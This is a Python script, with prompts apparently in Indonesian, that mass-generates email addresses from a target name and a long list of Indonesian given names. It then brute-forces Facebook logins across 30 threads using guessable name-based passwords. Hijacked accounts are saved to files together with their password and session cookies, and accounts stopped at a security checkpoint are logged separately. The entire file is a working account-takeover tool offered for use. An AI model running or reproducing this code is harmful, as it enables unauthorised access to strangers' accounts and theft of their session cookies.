import os, re, bs4, sys, json, rich, time, random, datetime, requests; from time import sleep, strftime; from rich.console import Console; from rich.panel import Panel; from random import choice as rc; from random import randint as rr; from random import randrange as rg; from concurrent.futures import ThreadPoolExecutor; now = datetime.datetime.now(); dta = {'1':'Jan','2':'Feb','3':'Mar','4':'Apr','5':'Mei','6':'Jun','7':'Jul','8':'Agu','9':'Sepr','10':'Okt','11':'Nov','12':'Des'}; tgl = now.day; bln = dta[(str(now.month))]; thn = now.year; okc = ('OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'); cpc = ('CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'); ok,cp,loop,id,id2,idf,P,M,K,B,H,N,bsp,ses = 0,0,0,[],[],[],'\x1b[1;97m','\x1b[1;91m','\x1b[1;93m','\x1b[1;94m','\x1b[1;92m','\x1b[0m',bs4.BeautifulSoup,requests.Session()

def Main_Menu():
	NiawMXV(); nama = Console().input(' > nama target: '); dump = Console().input(" > total clone: "); CC   = 0
	for xv in range(int(dump)):
		AA = nama; BB = Inisial(); CC+=1; cc = str(rr(0,999)); DD = rc(['',f'@{rc(["exdonuts","yahoo","hotmail","gmail"])}.com']); EE = rc([f'{AA}{rc(["",".",""])}{BB}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',f'{BB}{rc(["",".",""])}{AA}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',f'{AA}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',f'{AA}{rc(["",".",""])}{BB}{DD}',f'{BB}{rc(["",".",""])}{AA}{DD}']); FF = f'{EE}|{nama}'
		if FF in id: pass
		else: id.append(FF)
		print(f" > terkumpul {len(id)} email",end=("\r")); sleep(0.0007)
	Eksekusi()

def Eksekusi():
	for x in id: id2.append(x)
	NiawMXV(); Console(width=50).print(Panel(f"[underline][bold #FF00D4]* [bold #FFFFFF]crack [bold #00FF00]{len(id)}[bold #FFFFFF] email[bold #FF00D4] *[/underline]",style="bold purple",width=50),justify="center"); print()
	with ThreadPoolExecutor(max_workers=30) as MethodCrack:
		for uids in id2:
			user = uids.split('|')[0]; nmfl = uids.split('|')[1].lower(); nama = nmfl.split(' ')[0]; pasw = ['kata sandi',nama,nama+'12',nama+'123',nama+'1234',nama+'12345',nama+'123456',nama+'321',nama+'99',nama+'00',nama+'01',nama+'02',nama+'03',nama+'04',nama+'05',nama+'06',nama+'07',nama+'08',nama+'09',nama+'10',nama+'11',nama+'21',nama+'22',nama+'23',nama+' '+nama]
			MethodCrack.submit(Async,user,pasw,nmfl)
	print('\n'); Console().print(f'[bold #FFFFFF] > crack [bold #00FF00]{len(id)}[bold #FFFFFF] email selesai | akun ok:[bold #00FF00]{ok} [bold #FFFFFF]akun cp:[bold #FFFF00]{cp}'); exit()

def Async(user, pasw, nmfl):
	ses = requests.Session()
	usr = user.split('@')[0]
	global loop,ok,cp
	print(f"{N} > {M}{loop}{N}>{H}{ok}{N}:{K}{cp}{N}>{H}@{K}{usr}          {N}", end = ("\r"))
	for pw in pasw:
		try:
			requ = ses.get('https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
			kueh = (f'{";".join([ "%s=%s"%(keys, value) for keys, value in ses.cookies.get_dict().items() ])}')
			data = {
				'm_ts':re.search('name="m_ts" value="(.*?)"',str(requ)).group(1),
				'li':re.search('name="li" value="(.*?)"',str(requ)).group(1),
				'try_number':'0',
				'unrecognized_tries':'0',
				'email':f'{user}',
				'prefill_contact_point':f'{user}',
				'prefill_source':'browser_dropdown',
				'prefill_type':'password',
				'first_prefill_source':'browser_dropdown',
				'first_prefill_type':'contact_point',
				'had_cp_prefilled':'true',
				'had_password_prefilled':'true',
				'is_smart_lock':'false',
				'bi_xrwh':re.search('name="bi_xrwh" value="(.*?)"',str(requ)).group(1),
				'bi_wvdp':'{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
				'encpass':f'#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pw}',
				'fb_dtsg':re.search('{"dtsg":{"token":"(.*?)"',str(requ)).group(1),
				'jazoest':re.search('name="jazoest" value="(.*?)"',str(requ)).group(1),
				'lsd':re.search('name="lsd" value="(.*?)"',str(requ)).group(1),
				'__dyn':'',
				'__csr':'',
				'__req':rc(['1', '2', '3', '4', '5', '6', '7', '8', '9']),
				'__fmt':'1',
				'__a':re.search('"encrypted":"(.*?)"',str(requ)).group(1),
				'__user':'0'
			}
			head = {
				'Host': 'x.prod.facebook.com',
				'content-length': f'{len(str(data))}',
				'sec-ch-ua': '"Android WebView";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
				'sec-ch-ua-mobile': '?0',
				'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
				'x-response-format': 'JSONStream',
				'content-type': 'application/x-www-form-urlencoded',
				'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(requ)).group(1),
				'sec-ch-ua-platform-version': '""',
				'x-requested-with': 'XMLHttpRequest',
				'x-asbd-id': '129477',
				'sec-ch-ua-full-version-list': '"Android WebView";v="125.0.6422.53", "Chromium";v="125.0.6422.53", "Not.A/Brand";v="24.0.0.0"',
				'sec-ch-ua-model': '""',
				'sec-ch-prefers-color-scheme': 'dark',
				'sec-ch-ua-platform': '"Linux"',
				'accept': '*/*',
				'origin': 'https://x.prod.facebook.com',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
				'accept-encoding': 'gzip, deflate, br, zstd',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
				'priority': 'u=1, i'
			}
			resp = ses.post(
				'https://x.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',
				cookies = {'cookie': kueh}, data = data, headers = head, allow_redirects = False
			)
			if "c_user" in ses.cookies.get_dict():
				kue = ';'.join([x+'='+v for x,v in ses.cookies.get_dict().items()])
				uid = re.findall('c_user=(.*);xs',kue)[0]
				if uid in idf or user in idf:
					break
				idf.append(uid)
				ok+=1
				print(f" > {H}{uid}|{pw}|{kue}{N}")
				open('Okeh/'+okc,'a').write(f'{uid}|{pw}|{kue}\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				try: uid = ses.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				except: uid = user
				if uid in idf:
					break
				idf.append(uid)
				cp+=1
				print(f" > {K}{uid}|{pw}               {N}")
				open('Cepe/'+cpc,'a').write(f'{uid}|{pw}\n')
				break
			else: continue
		except (requests.exceptions.ConnectionError): sleep(15)
	loop +=1

def NiawMXV(): os.system('clear'); Console().print("""[bold #FF00D4]            L.                                   \n            EW:        ,ft                       \n            E##;       t#E                       \n :KW,      LE###t      t#E :KW,      L:KW,      L\n  ,#W:   ,KGE#fE#f     t#E  ,#W:   ,KG ,#W:   ,KG\n   ;#W. jWi E#t D#G    t#E   ;#W. jWi   ;#W. jWi \n    i#KED.  E#t  f#E.  t#E    i#KED.     i#KED.  \n     L#W.   E#t   t#K: t#E     L#W.       L#W.   \n   .GKj#K.  E#t    ;#W,t#E   .GKj#K.    .GKj#K.  \n  iWf  i#K. E#t     :K#D#E  iWf  i#K.  iWf  i#K. \n LK:    t#E E#t      .E##E LK:    t#E LK:    t#E \n i       tDj..         G#E i       tDji       tDj\n                        fE                       \n                         ,                       """)

def Inisial(): return rc(['aca','acha','ai','aii','adawiah','adawiyah','ade','adell','adel','adellaa','adelia','adellia','adeliya','adiba','adifa','adinda','aeni','aidah','aini','ainun','aira','asiah','aisah','aisyah','afifah','afipah','alawiah','alawiyah','ajahra','ajeng','ajeung','ajig','ajijah','ajizah','alesha','alia','alika','alimah','aliya','alifa','alifah','aliva','alivah','aliyah','almeera','almira','ama','amalia','amaliah','amaliyah','amanda','amidah','amira','aminah','ana','anantasia','anantasya','anastasia','anastasya','andini','ani','anisa','anita','any','anying','anyun','anggraeni','anggraini','anggi','anggita','anggun','anugerah','anugrah','anjing','apifah','apipah','april','aprilia','aprillia','apriliani','apriliyani','aprilianti','apriliyanti','aqila','aqilla','ara','arra','arafah','arrafah','areta','aretha','arofah','arin','arini','ariani','arista','ariyani','aryani','aryanti','arianti','ariyanti','arumi','arsita','arsyita','arsila','asyila','asypa','asifa','asipa','asmi','asmara','asih','asilah','asti','astiani','astiyani','astuti','atik','atika','atikah','ayg','ayank','ayang','ayra','ayu','ayyu','ayunda','ayuni','ayudia','ayudiya','ayudiah','ayuningsih','azzahra','azijah','azizah','azmi','azmy','azura','babi','baby','badriah','bajingan','bagong','bangsat','bela','bella','bibah','bila','billa','bintang','bulan','bunga','bungsu''cabi','cabhy','caby','cabby','caca','cca','cahaya','cahya','cahyani','camelia','cangcut','cans','canss','cantik','cantika','celsi','celsie','centil','chaca','chacha','chelsi','chelsie','chelsea','chika','cia','cci','cici','cika','cimok','cindy','cinta','cintia','cintaku','cintya','cintiya','citra','chindy','cucu','ccu','culun','cupu','cynthia','cyntia','dafina','dahlia','dania','daniah','daniyah','danyyah','daswita','dara','davina','dea','dede','dela','della','delia','delicia','denia','deniah','deniyah','deon','debi','deby','debby','denita','denisa','devi','devia','devie','desnia','desnie','divita','desi','desita','deswita','dwi','dewi','dewita','dhe','dhea','dheniah','dhewi','dhita','dhiya','dia','diah','diajeng','dian','diana','diandra','diannova','dias','dika','diksa','dila','dilla','dipa','diva','dianda','dila','dilla','dira','dina','dinda','dini','diniah','diniyah','disa','disha','dita','diya','diyah','dona','dyra','dyah','eka','eira','elfi','elia','eliana','elin','elina','elisabeth','elis','ellis','elise','eliya','eliza','elizabeth','ella','elma','elmira','elisa','elisha','elisia','elisiya','elisya','elisyha','elfina','elsa','evi','epi','elin','elsy','elva','elvira','elly' 'elvina','emi','emilia','emy','emyliya','ema','emma','endah','endang','erna','erni','erika','erlinda','esti','estiana','eis','eti','etie','ety','euis','eva','evita','evitamala','evalina','ewe','farah','farrah','fadila','fadla','fadhila','fadhla','faija','faiza','faizza','faizah','fani','fanni','fany','fanny','fanya','farida','faridha','fatin','fatim','faujia','faujiah','fauzia','fauziah','fauziya','fauzyah','fawziyah','fazila','fazilla','fazeela','fatima','fatimah','fathimah','felisia','felisya','ferli','ferly','fika','fina','fiona','fionna','fida','fira','firli','firly','fitri','fitriani','fitriyani','fitryani','frisilia','frisiliya','freya','friska','fuji','fuzi','gaby','gabby','gadis','geby','gebby','gelsey','gendis','gemoy','gea','ghea','gia','ghia','ghina','ghita','gina','ginna','gisela','gisella','gita','gitta','greta','gresik','giska','ganesha','geisha','habibah','hafsa','halima','halia','halimah','hafiza','hafsah','hafiza','hafizah','hana','handayani','handayanti','hanna','hannah','hani','hany','hanny','hanifah','hanipah','hania','haniya','hartini','hasanah','hatima','hatimah','hilda','hilma','hilmawati','hemalia','hepti','hesa','hessa','hesha','hesti','hestia','hesty','helga','hasna','hopi','hopipah','hoho','hotima','hotimah','hikmah','humaida','humayda','husna','hurairah','ica','icaa','icha','ichaa','ifa','iffa','ilmira','ina','inna','inaara','inara','inarah','inayah','indah','indira','indyra','indri','indry','insan','insani','imelda','ina','irma','irena','ika','ijah','intan','intanrahayu','ira','isabela','isabella','isan','isana','isyana','isah','isma','ismawati','ismawaty','ismi','isnaeni','iza','izah','jafira','jahira','jalilah','jahra','jamilah','jannah','jasmin','jayanti','jelita','jeni','jeny','jenita','jesica','jesika','jihan','jihana','jingga','juwita','juli','julia','juliana','juliet','jumaina','jumainah','juniarti','junaina','juwitta','jwita','kaila','kalia','kaira','khaira','karin','karina','kartika','kadek','kania','kaniya','kartini','kasih','kamala','kamila','karomah','karisa','karsih','katrina','keira','khaira','khaila','khafifah','khadijah','khairun','khairunisa','khalifah','khatimah','khopipah','kiki','kim','kila','kira','kirani','komarudin','kumala','kumalasari','kokom','komala','komalasari','kontol','kotima','kotimah','kulsum','kultsum','kuntul','kurnia','kurniati','kurniyati','kursina','kurniasih','kusmiati','kusmiyai','laela','lala','laila','lati','laty','latifah','lathifah','layla','laras','larasati','lasmini','laura','laudia','laudya','lela','lesmana','lena','leni','leny','lestari','lestary','lesti','lesty','levita','lia','lida','lidia','lidya','liana','liani','lilis','lina','linda','lintang','lis','lisa','lisha','lisna','lisnawati','lisnawaty','listi','listy','listia','listya','liza','liya','liyani','liza','lomrah','lulu','luna','lusi','lusy','luvita','lyna','lysa','mae','maemunah','maesarah','maesaroh','mala','maida','maidah','maira','maisa','maisha','malika','maimunah','magfirah','mahalini','maharani','maharini','mahda','mahmud','manda','mandha','maria','mardiah','mardianti','mardiyanti','mardyah','mardiyah','mariah','mariam','mariyah','maryati','mariati','mariyati','markonah','mariyam','marisa','marissa','martina','martinah','martini','maryamah','marwah','maryanti','marwati', 'marwaty','marzia','marziya','masitoh','masriah','masriyah','maulida','maulidia','maulidya','maulidiya','mawar','maya','mayra','maymuna','maymunah','marziah','meca','mecca','meka','mega','melani','melany','meli','melinda','melisa','melly','memek','mia','mila','mimin','mira','mirna','miranda','miya','mufliha','munaroh','munawarah','munawaroh','murni','murniati','murniyati','muslima','mulimah','muti','mutmainah','muthmainnah','mutmaidah','muthmaidah','mutia','mutiara','nabila','nada','nadhin','nadia','nadira','nadhira','nadin','nadiya','nafisa','nafisha','nafisah','nagita','naila','naira','najwa','nana','nanda','nani','natalia','nataliya','natasia','natasya','natasyha','naura','nayara','nayla','naswa','nashwa','nazwa','nia','nida','nifa','nina','nindi','nindy','ningrum','ningsih','nita','nitatalia','niken','nisa','nissa','nurul','nopi','novi','novita','nurull','nunung','nuri','nurianti','nurjanah','nuryanti','oca','octa','octavia','olivia','okta','oktavia','ocha','padma','putri','puspa','pipit','paramita' 'permata','permatasari','purnama','purnamasari','puspa','putri','puteri','pitri','pratiwi','pramita','priska','prisilia','qaila','qasimah','qila','qiqi','rana','rafa','raisa','rahma','rahmah','rahmawati','rahmawaty','rhma','rahnadani','rahmadhani','ramadani','ramadhani','rani','rany','rasya','rati','rara','rere','refa','repa','reva','repani','revani','rena','renatri','reni','renata','rani','ratna','rina','rida','rifda','rifdah','rini','ririn','rianti','rianty','riyanti','riyanty','riska','rizka','rohma','rohmah','rohmawati','rohmawaty','rosdiana','rosdiani','ross','rossa','rosita','rosalina','rosmanah','rum','rumaidah','ruwaidah','ryzka','sahara','saleha','salimah','sabrina','safa','saffa','safna','safira','saidah','sahira','sakila','sakinah','sakira','salma','salsa','salsabila','salsabyla','salwa','santi','sani','santy','santika','sara','shafira','shavira','shakira','shafna','shaleha','shalehah','shakeera','shakila','shalihah','shanti','shanty','shantika','shani','shaniyah','shofy','shofiyah','shofiyyah','sholeha','sholehah','sifa','silawati','sipa','silpi','silvi','siska','sinta','suci','selly','safitri','saputri','sarah','saras','sarasvati','saraswati','sari','sasmita','setiawati','sisil','siti','sity','siregar','simanjuntak','soleha','solehah','sonia','shonia','soraya','sukma','suci','sumi','sumiyati','suratni','surtini','suratmi','sasanti','susanty','susi','susilawati','susilawaty','susy','sutari','suteni','susu','syafaa','syakila','syakira','syifa','sypa','sya','syahla','syahira','syafira','syavira','tabita','tabhita','talia','taliah','talita','talitha','tami','tamimah','tammy','tania','taniya','tari','tarisa','tasya','taskia','taskiya','tazkia','tazkiya','tesa','tea','thea','thiara','tia','tias','tiastuti','tiara','tifani','tifany','tika','tina','tita','titian','titie','titin','tri','triani','tsunade','tsusilawati','tuti','tya','tiktok','tikotok','uci','uchi','ulfa','ulan','ulandari','ulandary','ulia','uliya','ulya','ulpah','ulpa','ulva','umayah','umi','umy','umiyah','umiati','umiaty','umiyati','utami','utari','ute','ubaidah','umaira','umairah','usna','usnah','uswah','uswatun','uswatunhasanah','uzwatun','vani','vany','vanya','valen','valentina','vanesa','vera','victoria','viktoria','via','vina','vivi','vivie','vianita','viola','veronica','veronika','viani','vianika','viana','viera','valencia','valensia','vita','vitaloka','vilmei','vega','viona','visi','wafa','wafda','wahdah','wardani','wardhani','wahdaniyah','wahidah','wanda','wangi','wardah','wastiqah','wati','watiah','watilah','watiyah','watsiqah','wasikoh','welas','wening','widi','widia','widhia','widhiya','widiya','widiasari','widiawati','widy','wikayah','wilona','windi','windiawati','windiasari','wina','wini','wiqayah','wikoyah','wiwin','windy','wulan','wulandari','xyz','xyzz','tzy','tyz','mojang','gemoy','imut','kebi','tembem','tete','gelis','geulis','ytta','kasep','ganteng','wibu','gojo','gojosatoru','santik','gerengseng','bokep','ewe','xtc','brigez','01','02','03','04','05','06','07','08','09','010','001','002','003','004','005','006','007','008','009','0010','00','000','0000','12345','123456','yani','yanti','yanto','yanty','yasira','yeni','yuli','yulia','yuliya','yulya','yulianti','yuliyanti','yuni','yunita','yuningsih','yuyu','yuyun','zahra','zafira','zahira','zahiyah','zahra','zahrani','zahrany','zahwa','zainab','zakiah','zaqiyah','zenab','zalfa','zalpa','zalva','zaskia','zaskiya','zaskiani','zaskiyani','zizah','zenia','zera','zhafira','zhafirah','zharifa','zharifah','zia','zizi','zyzy','zubaidah','zuhrah','zulfa','zulpa','zulva','zunaira','zunea'])

if __name__=='__main__':
	try: os.mkdir('Okeh')
	except: pass
	try: os.mkdir('Cepe')
	except: pass; Main_Menu()